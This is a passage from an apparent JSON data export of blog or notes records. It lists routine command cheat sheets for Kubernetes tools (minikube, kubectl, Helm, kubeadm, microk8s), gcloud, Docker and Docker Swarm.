      "description": "minikube\n\n```\nminikube version\nminikube start\nminikube stop\nminikube delete\nminikube ssh\n\nminikube profile list\n\nminikube delete --profile minikube\n\nminikube start --cpus=4 --memory=8gb   --disk-size=5gb \nminikube start --cpus=2 --memory=6000mb --disk-size=4000mb\nminikube start -p MYSUPERCLUSTER\nminikube start --nodes 2 -p multinode-demo\nminikube start --profile=mycluster --cpus 6 --memory 8192 --disk-size=50g\n\n\nkubectl version\nkubectl version --client\nkubectl get componentstatuses\nkubectl cluster-info\nkubectl get nodes\n\n```",
      "category": 32,
      "created_date": "2023-02-19T06:15:51.942Z",
      "updated_date": "2023-02-22T02:06:26.719Z"
    }
  },
  {
    "model": "sections.post",
    "pk": 45,
    "fields": {
      "name": "gcloud",
      "slug": "btbf6p1",
      "description": "gcloud\n\n```\ngcloud version\ngcloud init\ngcloud services enable container.googleapis.com\n\ngcloud container clusters create denis\ngcloud container clusters create denis --num-nodes=4\ngcloud container clusters get-credentials denis\ngcloud container clusters delete denis\n\nkubectl version --client\nkubectl cluster-info\nkubectl get nodes\n```",
      "category": 32,
      "created_date": "2023-02-19T06:16:43.627Z",
      "updated_date": "2023-02-19T06:17:13.080Z"
    }
  },
  {
    "model": "sections.post",
    "pk": 46,
    "fields": {
      "name": "docker",
      "slug": "h6tyn6s",
      "description": "```\ndocker build -t myk8sapp  .\ndocker login\ndocker tag  myk8sapp:latest  adv4000/k8sphp:latest\ndocker push\ndocker images\ndocker rmi XXXXXXXXX -f\ndocker run -it -p 1234:80 adv4000/k8sphp:latest\n```",
      "category": 32,
      "created_date": "2023-02-19T06:30:21.454Z",
      "updated_date": "2023-02-19T06:30:41.711Z"
    }
  },
  {
    "model": "sections.post",
    "pk": 47,
    "fields": {
      "name": "kubectl",
      "slug": "jk1o0y5",
      "description": "kubectl \n\n```\nkubectl get pods\nkubectl run hello --image=nginx:latest --port=80\nkubectl port-forward hello 7777:80 \nkubectl describe pods hello\nkubectl delete pods hello\nkubectl logs hello\nkubectl exec my-web -- date\nkubectl exec -it my-web -- bash\nkubectl apply -f myfile.yaml\nkubectl delete -f myfile.yaml\n\nkubectl get deployments\nkubectl get rs\nkubectl create deployment denis-deployment --image httpd:latest\nkubectl describe deplyoments denis-deployment\nkubectl scale deployment denis-deployment --replicas 4\nkubectl autoscale deployment denis  --min=10 --max=15 --cpu-percent=80\nkubectl get hpa\n\nkubectl set image deployment/denis-deployment k8sphp=adv4000/k8sphp:version2 --record\nkubectl rollout status deployment/denis-deployment \nkubectl rollout history deployment/denis-deployment\nkubectl rollout undo deployment/denis-deployment \nkubectl rollout undo deployment/denis-deployment --to-revision=2\nkubectl rollout restart deployment/denis-deployment \n\nkubectl delete deployments denis-deployment \n\nkubectl create deployment denis-deployment --image adv4000/k8sphp:latest\nkubectl get deployment\nkubectl scale deployment denis-deployment --replicas 4\nkubectl expose deployment denis-deployment --type=ClusterIP --port 80\nkubectl expose deployment denis-deployment --type=NodePort --port 80\nkubectl expose deployment denis-deployment --type=LoadBalancer --port 80\nkubectl get services\nkubectl get svc\nkubectl describe nodes | grep ExternalIP\n\nkubectl delete services  my-webserver\n\nkubectl apply -f https://projectcontour.io/quickstart/contour.yaml\nkubectl get services -n projectcontour envoy -o wide\nkubectl create deployment main    --image=adv4000/k8sphp:latest \nkubectl create deployment web1    --image=adv4000/k8sphp:version1\nkubectl create deployment web2    --image=adv4000/k8sphp:version2\nkubectl scale deployment main    --replicas 2\nkubectl scale deployment web1    --replicas 2\nkubectl scale deployment web2    --replicas 2\nkubectl expose deployment main   --port 80   # --type=ClusterIP  DEFAULT\nkubectl expose deployment web1   --port 80\nkubectl expose deployment web2   --port 80\nkubectl expose deployment tomcat --port 8080\n\nkubectl get services -o wide\n\nkubectl apply -f ingress-hosts.yaml\nkubectl apply -f ingress-paths.yaml\nkubectl get ingress\nkubectl describe ingress\nkubectl delete ns projectcontour\n\n\n\n```",
      "category": 32,
      "created_date": "2023-02-19T06:31:20.667Z",
      "updated_date": "2023-02-19T06:33:50.739Z"
    }
  },
  {
    "model": "sections.post",
    "pk": 48,
    "fields": {
      "name": "helm",
      "slug": "sa2okui",
      "description": "```\nhelm version\nhelm list\n\nhelm search hub\nhelm search repo\n\nhelm install app1 Denis-Chart/\nhelm upgrade app1 Denis-Chart/ --set container.image=adv4000/k8sphp:version2\n\nhelm create MyChart\nhelm package Denis-Chart/\nhelm install app2 App-HelmChart-0.1.0.tgz\nhelm delete app1\nhelm uninstall app1\n\nhelm repo add bitnami https://charts.bitnami.com/bitnami\nhelm install my_website bitnami/apache -f my_values.yaml\n```",
      "category": 32,
      "created_date": "2023-02-19T06:33:52.156Z",
      "updated_date": "2023-02-19T06:34:09.449Z"
    }
  },
  {
    "model": "sections.post",
    "pk": 49,
    "fields": {
      "name": "checkout",
      "slug": "eanhn48",
      "description": "```\ngit checkout -b dev\n```",
      "category": 4,
      "created_date": "2023-02-21T00:41:45.129Z",
      "updated_date": "2023-02-21T00:42:10.720Z"
    }
  },
  {
    "model": "sections.post",
    "pk": 50,
    "fields": {
      "name": "docker",
      "slug": "ta4ay08",
      "description": "```\ndocker build -t myk8sapp .\n```",
      "category": 2,
      "created_date": "2023-02-21T02:53:41.098Z",
      "updated_date": "2023-02-21T02:54:00.075Z"
    }
  },
  {
    "model": "sections.post",
    "pk": 51,
    "fields": {
      "name": "kubeadm",
      "slug": "qi4qljo",
      "description": "kubeadm \n\nhttps://kubernetes.io/docs/setup/production-environment/tools/kubeadm/install-kubeadm/\n\n```\nsudo apt-get update\nsudo apt-get install -y apt-transport-https ca-certificates curl\nsudo curl -fsSLo /etc/apt/keyrings/kubernetes-archive-keyring.gpg https://packages.cloud.google.com/apt/doc/apt-key.gpg\necho \"deb [signed-by=/etc/apt/keyrings/kubernetes-archive-keyring.gpg] https://apt.kubernetes.io/ kubernetes-xenial main\" | sudo tee /etc/apt/sources.list.d/kubernetes.list\nsudo apt-get update\nsudo apt-get install -y kubelet kubeadm kubectl\nsudo apt-mark hold kubelet kubeadm kubectl\nsudo kubeadm init\n```\n```\nwget https://github.com/containerd/containerd/releases/download/v1.6.12/containerd-1.6.12-linux-amd64.tar.gz\ntar xvf containerd-1.6.12-linux-amd64.tar.gz\nsystemctl stop containerd\ncd bin\ncp * /usr/bin/\nsystemctl start containerd\n```",
      "category": 32,
      "created_date": "2023-02-23T10:07:30.700Z",
      "updated_date": "2023-02-23T12:23:01.788Z"
    }
  },
  {
    "model": "sections.post",
    "pk": 52,
    "fields": {
      "name": "microk8s",
      "slug": "amczp9f",
      "description": "microk8s \n\n```\nsudo apt-get install snapd\nsudo snap install microk8s --classic --channel=1.26\nsudo usermod -a -G microk8s $USER\nsudo chown -f -R $USER ~/.kube\nmicrok8s status --wait-ready\nalias kubectl='microk8s kubectl'\nmicrok8s enable dns hostpath-storage\nmicrok8s start\nmicrok8s stop\n\nmicrok8s kubectl get all --all-namespaces\n\nmicrok8s enable dashboard dns\nmicrok8s kubectl get services -n kube-system\nmicrok8s kubectl port-forward -n kube-system service/kubernetes-dashboard --address 0.0.0.0 10443:443\n```\n\n```\nmicrok8s enable portainer\n\nmicrok8s disable portainer\n\n```\nhttp://127.0.0.1:30777/\nhttps://127.0.0.1:30779/",
      "category": 32,
      "created_date": "2023-02-23T10:07:36.677Z",
      "updated_date": "2023-03-03T16:11:30.220Z"
    }
  },
  {
    "model": "sections.post",
    "pk": 53,
    "fields": {
      "name": "nodes",
      "slug": "sr070it",
      "description": "```\nplay-with-docker\ndocker swarm init --advertise-addr 192.168.0.28\ndocker swarm leave\ndocker node rm node3\n\ndocker stack deploy  -c ./stack.yaml wp\n```",
      "category": 33,
      "created_date": "2023-02-24T15:17:54.087Z",
      "updated_date": "2023-02-24T16:14:22.377Z"
    }
  },
  {
    "model": "sections.post",
    "pk": 54,
    "fields": {
      "name": "name",
      "slug": "yhh01qs",
      "description": "description",
      "category": 33,
      "created_date": "2023-02-24T15:17:55.271Z",
      "updated_date": "2023-02-24T15:17:55.271Z"
    }
  },
  {
    "model": "sections.post",
    "pk": 55,
    "fields": {
      "name": "build",
      "slug": "g6cdjpw",
      "description": "docker compose -f swarm_compose.yaml up --build",
      "category": 33,
      "created_date": "2023-02-24T15:17:56.374Z",
      "updated_date": "2023-02-28T00:15:41.828Z"
    }
  },
  {
    "model": "sections.post",
    "pk": 56,
    "fields": {
      "name": "service",
      "slug": "ko09ltg",
      "description": "```\ndocker service create --replicas 1 --name helloworld alpine ping docker.com\ndocker service ls\n```",
      "category": 33,
      "created_date": "2023-02-24T15:17:57.452Z",
      "updated_date": "2023-02-27T06:11:53.382Z"
    }
  }
]
